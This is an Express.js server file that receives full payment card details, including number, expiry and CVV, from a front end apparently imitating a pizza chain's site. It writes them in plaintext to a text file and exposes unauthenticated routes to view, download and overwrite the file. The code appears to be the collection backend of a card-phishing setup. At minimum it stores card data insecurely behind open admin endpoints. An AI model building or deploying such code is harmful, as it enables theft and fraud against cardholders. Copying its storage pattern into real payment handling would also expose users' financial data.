const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;
const path = require('path');

app.use(cors({
  origin: 'https://pizza-hut-iota.vercel.app'
}));
// app.use(cors())
app.use(bodyParser.json());

app.post('/save-payment', (req, res) => {
  const { address, cardholderName, cardNumber, expiry, cvv } = req.body;

  let existing = '';
  if (fs.existsSync('users.txt')) {
    existing = fs.readFileSync('users.txt', 'utf8');
  }
  const lines = existing.trim() ? existing.trim().split('\n') : [];
  const entryNumber = lines.length + 1;

  const now = new Date();
  const formattedTime = now.toISOString().replace('T', ' ').split('.')[0];

  const line = `#${entryNumber} | ${formattedTime} | ADDRESS: ${address} | CARDHOLDER: ${cardholderName} | CARD: ${cardNumber} | EXPIRY: ${expiry} | CVV: ${cvv}\n`;

  fs.appendFile('users.txt', line, (err) => {
    if (err) {
      console.error(err);
      return res.status(500).json({ error: 'Error saving data' });
    }
    res.json({ message: 'Data saved' });
  });
});

app.get('/admin-data', (req, res) => {
  fs.readFile('users.txt', 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).send('Error reading data');
    }
    res.send(data);
  });
});

app.get('/download-users', (req, res) => {
  const filePath = path.join(__dirname, 'users.txt');
  res.download(filePath, 'users.txt', (err) => {
    if (err) {
      console.error('Download error:', err);
      res.status(500).send('Error downloading file');
    }
  });
});

app.post('/admin-edit', (req, res) => {
  const { updatedData } = req.body;
  fs.writeFile('users.txt', updatedData, (err) => {
    if (err) {
      console.error(err);
      return res.status(500).send('Error saving edited data');
    }
    res.send('Database updated successfully!');
  });
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
